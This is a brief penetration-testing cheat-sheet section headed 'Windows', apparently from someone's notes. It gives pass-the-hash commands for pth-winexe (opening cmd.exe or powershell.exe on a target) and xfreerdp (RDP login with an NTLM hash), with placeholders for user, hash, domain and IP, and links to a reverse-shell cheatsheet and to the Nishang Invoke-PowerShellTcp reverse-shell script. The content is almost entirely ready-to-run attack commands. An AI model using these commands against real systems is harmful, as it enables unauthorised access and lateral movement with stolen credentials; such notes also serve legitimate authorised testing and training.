## Windows
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell

### pth-winexe
```bash
sudo pth-winexe -U web/<user>%<hash>  //<IP> cmd.exe 
sudo pth-winexe -U web/<user>%<hash>  //<IP> powershell.exe 
```

### xfreerdp
```bash
xfreerdp /u:<user> /pth:<hash> /d:<domain> /v:<IP>
```

https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1